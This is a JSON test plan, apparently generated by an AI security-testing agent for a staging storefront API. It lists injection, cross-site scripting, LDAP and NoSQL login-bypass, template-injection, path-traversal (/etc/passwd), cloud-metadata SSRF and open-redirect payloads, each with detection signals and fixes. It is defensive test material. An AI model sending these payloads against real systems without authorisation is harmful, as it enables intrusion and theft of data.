@@ -1,0 +1,1219 @@
+{
+  "api": "Shopfront Storefront API",
+  "base_url": "https://staging.shopfront.example.com/api/v1",
+  "source": "e:/Visual Studio Code/AiTester/08_Automate_Daily_QA_Tasks_AI_Agents/02_Langflow_Agents/15_Security_Test_Generator_AI_Agent/sample_apis/shopfront_openapi.json",
+  "format": "openapi-json",
+  "endpoints_total": 11,
+  "params_total": 19,
+  "untested_endpoints": [
+    "GET /status"
+  ],
+  "vectors_total": 46,
+  "severity_counts": {
+    "critical": 20,
+    "high": 21,
+    "medium": 5,
+    "low": 0
+  },
+  "category_counts": {
+    "injection": 40,
+    "access_control": 3,
+    "ssrf": 1,
+    "validation": 2
+  },
+  "attack_counts": {
+    "SQL injection": 17,
+    "Reflected cross-site scripting": 12,
+    "Broken object-level authorization (IDOR)": 3,
+    "HTTP header / CRLF injection": 3,
+    "Server-side template injection": 3,
+    "NoSQL injection": 2,
+    "Open redirect": 2,
+    "LDAP injection": 1,
+    "Path traversal": 1,
+    "Server-side request forgery": 1,
+    "XML external entity": 1
+  },
+  "endpoints": [
+    {
+      "path": "/login",
+      "method": "POST",
+      "params": [
+        {
+          "name": "username",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": true
+        },
+        {
+          "name": "password",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": true
+        }
+      ],
+      "vector_count": 8,
+      "params_count": 2
+    },
+    {
+      "path": "/products",
+      "method": "GET",
+      "params": [
+        {
+          "name": "q",
+          "in": "query",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "category",
+          "in": "query",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "sort",
+          "in": "query",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "page",
+          "in": "query",
+          "type": "integer",
+          "required": false,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 7,
+      "params_count": 4
+    },
+    {
+      "path": "/reviews",
+      "method": "POST",
+      "params": [
+        {
+          "name": "productId",
+          "in": "body",
+          "type": "integer",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "comment",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "displayName",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 7,
+      "params_count": 3
+    },
+    {
+      "path": "/integrations/webhook",
+      "method": "POST",
+      "params": [
+        {
+          "name": "url",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        },
+        {
+          "name": "event",
+          "in": "body",
+          "type": "string",
+          "required": false,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 7,
+      "params_count": 2
+    },
+    {
+      "path": "/auth/callback",
+      "method": "GET",
+      "params": [
+        {
+          "name": "code",
+          "in": "query",
+          "type": "string",
+          "required": false,
+          "auth_context": true
+        },
+        {
+          "name": "next",
+          "in": "query",
+          "type": "string",
+          "required": false,
+          "auth_context": true
+        }
+      ],
+      "vector_count": 6,
+      "params_count": 2
+    },
+    {
+      "path": "/orders/{orderId}",
+      "method": "GET",
+      "params": [
+        {
+          "name": "orderId",
+          "in": "path",
+          "type": "integer",
+          "required": true,
+          "auth_context": false
+        },
+        {
+          "name": "Authorization",
+          "in": "header",
+          "type": "string",
+          "required": true,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 3,
+      "params_count": 2
+    },
+    {
+      "path": "/files/download",
+      "method": "GET",
+      "params": [
+        {
+          "name": "path",
+          "in": "query",
+          "type": "string",
+          "required": true,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 3,
+      "params_count": 1
+    },
+    {
+      "path": "/products/{productId}",
+      "method": "GET",
+      "params": [
+        {
+          "name": "productId",
+          "in": "path",
+          "type": "integer",
+          "required": true,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 2,
+      "params_count": 1
+    },
+    {
+      "path": "/users/{userId}",
+      "method": "GET",
+      "params": [
+        {
+          "name": "userId",
+          "in": "path",
+          "type": "integer",
+          "required": true,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 2,
+      "params_count": 1
+    },
+    {
+      "path": "/catalog/import",
+      "method": "POST",
+      "params": [
+        {
+          "name": "<xml body>",
+          "in": "body",
+          "type": "xml",
+          "required": true,
+          "auth_context": false
+        }
+      ],
+      "vector_count": 1,
+      "params_count": 1
+    },
+    {
+      "path": "/status",
+      "method": "GET",
+      "params": [],
+      "vector_count": 0,
+      "params_count": 0
+    }
+  ],
+  "vectors": [
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "q",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "q",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "category",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "category",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "sort",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "sort",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/products",
+      "method": "GET",
+      "param": "page",
+      "param_in": "query",
+      "param_type": "integer",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/products/{productId}",
+      "method": "GET",
+      "param": "productId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/products/{productId}",
+      "method": "GET",
+      "param": "productId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "bola",
+      "attack_name": "Broken object-level authorization (IDOR)",
+      "category": "access_control",
+      "owasp": "A01:2021 Broken Access Control / API1:2023 / WSTG-ATHZ-04",
+      "severity": "critical",
+      "payloads": [
+        "<the id of an object belonging to another user>",
+        "1",
+        "0",
+        "-1",
+        "<a valid id you were not given>"
+      ],
+      "positive_signal": "You receive an object that belongs to a different user or account than yours.",
+      "remediation": "Check on every request that the authenticated user owns the object.",
+      "note": "This is an access-control check, not an injection - do not send injection strings, change the identifier to one you should not be able to see."
+    },
+    {
+      "endpoint": "/users/{userId}",
+      "method": "GET",
+      "param": "userId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/users/{userId}",
+      "method": "GET",
+      "param": "userId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "bola",
+      "attack_name": "Broken object-level authorization (IDOR)",
+      "category": "access_control",
+      "owasp": "A01:2021 Broken Access Control / API1:2023 / WSTG-ATHZ-04",
+      "severity": "critical",
+      "payloads": [
+        "<the id of an object belonging to another user>",
+        "1",
+        "0",
+        "-1",
+        "<a valid id you were not given>"
+      ],
+      "positive_signal": "You receive an object that belongs to a different user or account than yours.",
+      "remediation": "Check on every request that the authenticated user owns the object.",
+      "note": "This is an access-control check, not an injection - do not send injection strings, change the identifier to one you should not be able to see."
+    },
+    {
+      "endpoint": "/orders/{orderId}",
+      "method": "GET",
+      "param": "orderId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/orders/{orderId}",
+      "method": "GET",
+      "param": "orderId",
+      "param_in": "path",
+      "param_type": "integer",
+      "attack": "bola",
+      "attack_name": "Broken object-level authorization (IDOR)",
+      "category": "access_control",
+      "owasp": "A01:2021 Broken Access Control / API1:2023 / WSTG-ATHZ-04",
+      "severity": "critical",
+      "payloads": [
+        "<the id of an object belonging to another user>",
+        "1",
+        "0",
+        "-1",
+        "<a valid id you were not given>"
+      ],
+      "positive_signal": "You receive an object that belongs to a different user or account than yours.",
+      "remediation": "Check on every request that the authenticated user owns the object.",
+      "note": "This is an access-control check, not an injection - do not send injection strings, change the identifier to one you should not be able to see."
+    },
+    {
+      "endpoint": "/orders/{orderId}",
+      "method": "GET",
+      "param": "Authorization",
+      "param_in": "header",
+      "param_type": "string",
+      "attack": "header_crlf",
+      "attack_name": "HTTP header / CRLF injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-16",
+      "severity": "medium",
+      "payloads": [
+        "%0d%0aX-Injected:%201",
+        "%0d%0aSet-Cookie:%20injected=1",
+        "\r\nX-Injected: 1"
+      ],
+      "positive_signal": "The injected header (X-Injected, Set-Cookie) appears in the response headers.",
+      "remediation": "Strip CR and LF from anything written into a header."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "username",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "username",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "nosqli",
+      "attack_name": "NoSQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "high",
+      "payloads": [
+        "{\"$ne\": null}",
+        "{\"$gt\": \"\"}",
+        "{\"$regex\": \".*\"}",
+        "' || '1'=='1"
+      ],
+      "positive_signal": "Authentication bypassed, or records returned that a plain value would not match.",
+      "remediation": "Validate types server-side; reject objects where a scalar is expected."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "username",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "username",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "ssti",
+      "attack_name": "Server-side template injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-18",
+      "severity": "high",
+      "payloads": [
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}"
+      ],
+      "positive_signal": "The number 49 appears in the response where 7*7 was evaluated.",
+      "remediation": "Never build a template from user input; pass it as data to a fixed template."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "username",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "ldap",
+      "attack_name": "LDAP injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-06",
+      "severity": "high",
+      "payloads": [
+        "*",
+        "*)(uid=*",
+        "admin)(&)",
+        "*)(|(uid=*",
+        "*))%00"
+      ],
+      "positive_signal": "Authentication bypassed, or more directory entries returned than a real value matches.",
+      "remediation": "Escape LDAP special characters; use a parameterised directory query."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "password",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "password",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "nosqli",
+      "attack_name": "NoSQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "high",
+      "payloads": [
+        "{\"$ne\": null}",
+        "{\"$gt\": \"\"}",
+        "{\"$regex\": \".*\"}",
+        "' || '1'=='1"
+      ],
+      "positive_signal": "Authentication bypassed, or records returned that a plain value would not match.",
+      "remediation": "Validate types server-side; reject objects where a scalar is expected."
+    },
+    {
+      "endpoint": "/login",
+      "method": "POST",
+      "param": "password",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "productId",
+      "param_in": "body",
+      "param_type": "integer",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "comment",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "comment",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "comment",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "ssti",
+      "attack_name": "Server-side template injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-18",
+      "severity": "high",
+      "payloads": [
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}"
+      ],
+      "positive_signal": "The number 49 appears in the response where 7*7 was evaluated.",
+      "remediation": "Never build a template from user input; pass it as data to a fixed template."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "displayName",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "displayName",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/reviews",
+      "method": "POST",
+      "param": "displayName",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "ssti",
+      "attack_name": "Server-side template injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-18",
+      "severity": "high",
+      "payloads": [
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}"
+      ],
+      "positive_signal": "The number 49 appears in the response where 7*7 was evaluated.",
+      "remediation": "Never build a template from user input; pass it as data to a fixed template."
+    },
+    {
+      "endpoint": "/files/download",
+      "method": "GET",
+      "param": "path",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/files/download",
+      "method": "GET",
+      "param": "path",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/files/download",
+      "method": "GET",
+      "param": "path",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "path_traversal",
+      "attack_name": "Path traversal",
+      "category": "injection",
+      "owasp": "A01:2021 Broken Access Control / WSTG-ATHZ-01",
+      "severity": "high",
+      "payloads": [
+        "../../../../etc/passwd",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "/etc/passwd"
+      ],
+      "positive_signal": "File contents that are not the intended file - root:x:0:0 from /etc/passwd, or the [fonts] section of win.ini.",
+      "remediation": "Resolve to a canonical path and confirm it stays inside the allowed root."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "url",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "url",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "url",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "ssrf",
+      "attack_name": "Server-side request forgery",
+      "category": "ssrf",
+      "owasp": "A10:2021 SSRF / WSTG-INPV-19",
+      "severity": "high",
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:22",
+        "http://localhost/",
+        "file:///etc/passwd",
+        "http://[::1]/"
+      ],
+      "positive_signal": "Cloud metadata, an internal service banner, or a timing difference between a reachable internal host and an unreachable one.",
+      "remediation": "Allow-list destinations; block link-local, loopback and private ranges."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "url",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "open_redirect",
+      "attack_name": "Open redirect",
+      "category": "validation",
+      "owasp": "A01:2021 Broken Access Control / WSTG-CLNT-04",
+      "severity": "medium",
+      "payloads": [
+        "//evil.example.com",
+        "https://evil.example.com",
+        "/\\evil.example.com",
+        "https:evil.example.com",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "A 3xx response whose Location header points at evil.example.com.",
+      "remediation": "Redirect only to a relative path or an allow-listed host."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "url",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "header_crlf",
+      "attack_name": "HTTP header / CRLF injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-16",
+      "severity": "medium",
+      "payloads": [
+        "%0d%0aX-Injected:%201",
+        "%0d%0aSet-Cookie:%20injected=1",
+        "\r\nX-Injected: 1"
+      ],
+      "positive_signal": "The injected header (X-Injected, Set-Cookie) appears in the response headers.",
+      "remediation": "Strip CR and LF from anything written into a header."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "event",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
+        "' UNION SELECT NULL-- "
+      ],
+      "positive_signal": "A database error in the response, a 500, results that change between ' OR '1'='1 and ' OR '1'='2, or a ~5s delay on the SLEEP / WAITFOR probe.",
+      "remediation": "Use parameterised queries; never build SQL by string concatenation."
+    },
+    {
+      "endpoint": "/integrations/webhook",
+      "method": "POST",
+      "param": "event",
+      "param_in": "body",
+      "param_type": "string",
+      "attack": "xss",
+      "attack_name": "Reflected cross-site scripting",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-01",
+      "severity": "high",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "'\"><svg onload=alert(1)>",
+        "javascript:alert(1)"
+      ],
+      "positive_signal": "The payload comes back in the response body unencoded - the < and > are still angle brackets, not &lt; and &gt;.",
+      "remediation": "Context-encode on output; set a Content-Security-Policy."
+    },
+    {
+      "endpoint": "/auth/callback",
+      "method": "GET",
+      "param": "code",
+      "param_in": "query",
+      "param_type": "string",
+      "attack": "sqli",
+      "attack_name": "SQL injection",
+      "category": "injection",
+      "owasp": "A03:2021 Injection / WSTG-INPV-05",
+      "severity": "critical",
+      "payloads": [
+        "'",
+        "' OR '1'='1",
+        "' OR '1'='1' -- ",
+        "1 OR 1=1",
